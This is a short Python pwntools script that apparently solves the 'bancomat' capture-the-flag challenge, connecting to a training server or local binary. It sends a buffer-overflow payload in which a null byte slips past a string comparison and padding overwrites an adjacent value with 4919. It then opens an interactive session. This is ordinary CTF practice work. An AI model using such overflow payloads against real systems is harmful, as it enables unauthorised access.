from pwn import *
elf = ELF('./bancomat')
context.binary = elf
context.terminal = ()
if args.REMOTE:
    p = remote('bancomat.challs.olicyber.it', 38049)
elif args.GDB:
    p = gdb.debug([elf.path], '''
                  b main
                  '''
                  )
else:
    p = process([elf.path])

p.recvuntil(b'> ')
p.sendline(b'1')
p.recvline()
payload = b'cambiami' + b'\x00' + b'a'*39 + p32(4919) # byte nullo per superare lo string compare
p.sendline(payload)
p.recvline()
p.sendline(b'1')
p.recvuntil(b'> ')
p.sendline(b'3')
p.interactive()